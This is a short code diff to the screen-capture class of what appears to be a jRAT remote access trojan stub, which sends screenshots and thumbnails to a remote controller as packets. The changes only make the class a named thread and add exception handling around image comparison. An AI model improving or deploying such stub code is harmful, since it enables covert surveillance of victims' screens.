@@ -20,7 +20,7 @@ import se.jrat.stub.packets.outgoing.Packet26RemoteScreen;
 import se.jrat.stub.packets.outgoing.Packet33Thumbnail;
 import se.jrat.stub.packets.outgoing.Packet68RemoteScreenComplete;
 
-public class Screen implements Runnable {
+public class Screen extends Thread {
 
 	public static Screen instance;
 
@@ -33,6 +33,7 @@ public class Screen implements Runnable {
 	public static BufferedImage[] prevSums = new BufferedImage[0];
 
 	public Screen(int size, int quality, int monitor, int columns, int rows) {
+		super("Screen capture thread");
 		Screen.instance = this;
 		this.size = size;
 		this.quality = quality;
@@ -115,8 +116,14 @@ public class Screen implements Runnable {
 
 					BufferedImage prev = prevSums[is];
 
-					if (!compare(prev, i)) {
+					try {
+						if (!compare(prev, i)) {
+							update = true;
+						}
+					} catch (ArrayIndexOutOfBoundsException e) {
 						update = true;
+					} catch (Exception e) {
+						e.printStackTrace();
 					}
 					
 					ByteArrayOutputStream bss = new ByteArrayOutputStream();
